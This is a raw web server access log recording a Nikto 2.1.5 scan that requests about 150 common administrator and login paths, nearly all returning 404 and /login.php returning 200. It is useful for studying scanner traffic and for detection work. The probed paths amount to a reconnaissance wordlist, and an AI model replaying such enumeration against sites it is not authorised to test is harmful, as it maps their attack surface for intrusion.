172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administr8.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006246)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administr8.html HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006247)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administr8.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006248)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administr8/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006249)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administracao.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006250)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administra\xc3\xa7ao.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006251)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administracao/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006252)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administra\xc3\xa7ao/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006253)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administracion.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006254)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administracion/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006255)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrateur.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006256)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrateur/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006257)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administratie/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006258)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administration.html HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006259)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administration.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006260)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administration/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006261)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator.asp HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006262)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator.html HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006263)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006264)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/account.asp HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006265)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/account.html HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006266)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/account.php HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006267)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/index.asp HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006268)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/index.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006269)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/index.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006270)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/login.asp HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006271)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/login.html HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006272)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrator/login.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006273)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administratoraccounts/ HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006274)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrators/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006275)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /administrivia/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006276)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /adminisztr\xc3\xa1tora.php HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006277)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /adminisztr\xc3\xa1tora/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006278)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /adminpanel.asp HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006279)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /adminpanel.html HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006280)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /adminpanel.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006281)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /adminpro/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006282)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admins.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006283)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admins.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006284)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admins.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006285)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /admins/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006286)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /AdminTools/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006287)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /amministratore.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006288)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /amministratore/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006289)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /autologin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006290)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /banneradmin/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006291)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /bbadmin/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006292)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /beheerder.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006293)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /beheerder/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006294)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /bigadmin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006295)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /blogindex/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006296)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cadmins/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006297)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ccms/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006298)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ccms/index.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006299)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ccms/login.php HTTP/1.1" 404 469 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006300)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ccp14admin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006301)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cmsadmin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006302)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /configuration/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006303)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /configure/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006304)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /controlpanel.asp HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006305)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /controlpanel.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006306)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /controlpanel.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006307)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /controlpanel/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006308)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cp.asp HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006309)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cp.html HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006310)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cp.php HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006311)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /cpanel_file/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006312)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /customer_login/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006313)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /database_administration/ HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006314)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Database_Administration/ HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006315)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /dir-login/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006316)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /directadmin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006317)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ezsqliteadmin/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006318)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /fileadmin.asp HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006319)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /fileadmin.html HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006320)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /fileadmin.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006321)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /formslogin/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006322)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /globes_admin/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006323)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /hpwebjetadmin/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006324)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Indy_admin/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006325)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /irc-macadmin/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006326)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /LiveUser_Admin/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006327)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login_db/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006328)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login-redirect/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006329)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login-us/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006330)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login.asp HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006331)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login.html HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006332)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login.php HTTP/1.1" 200 1992 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006333)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /login1/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006334)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /loginflat/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006335)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /logo_sysadmin/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006336)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Lotus_Domino_Admin/ HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006337)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /macadmin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006338)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /maintenance/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006339)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /manuallogin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006340)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /memlogin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006341)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /meta_login/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006342)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modelsearch/login.asp HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006343)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /modelsearch/login.php HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006344)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator.asp HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006345)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator.html HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006346)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator.php HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006347)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006348)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/admin.asp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006349)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/admin.html HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006350)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/admin.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006351)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/login.asp HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006352)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/login.html HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006353)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /moderator/login.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006354)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /myadmin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006355)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /navSiteAdmin/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006356)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /newsadmin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006357)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /openvpnadmin/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006358)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /painel/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006359)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /panel/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006360)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /pgadmin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006361)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phpldapadmin/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006362)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phppgadmin/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006363)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /phpSQLiteAdmin/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006364)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /platz_login/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006365)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /power_user/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006366)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /project-admins/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006367)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /pureadmin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006368)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /radmind-1/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006369)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /radmind/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006370)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /rcLogin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006371)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /server_admin_small/ HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006372)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Server.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006373)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Server.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006374)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Server.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006375)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ServerAdministrator/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006376)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /showlogin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006377)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /simpleLogin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006378)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /smblogin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006379)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sql-admin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006380)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ss_vms_admin_sm/ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006381)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sshadmin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006382)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /staradmin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006383)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sub-login/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006384)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /Super-Admin/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006385)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /support_login/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006386)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sys-admin/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006387)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sysadmin.asp HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006388)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sysadmin.html HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006389)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sysadmin.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006390)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sysadmin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006391)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /SysAdmin/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006392)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /SysAdmin2/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006393)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /sysadmins/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006394)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system_administration/ HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006395)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /system-administration/ HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006396)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ur-admin.asp HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006398)"
172.17.0.1 - - [12/Feb/2019:08:08:33 +0000] "GET /ur-admin.html HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006399)"
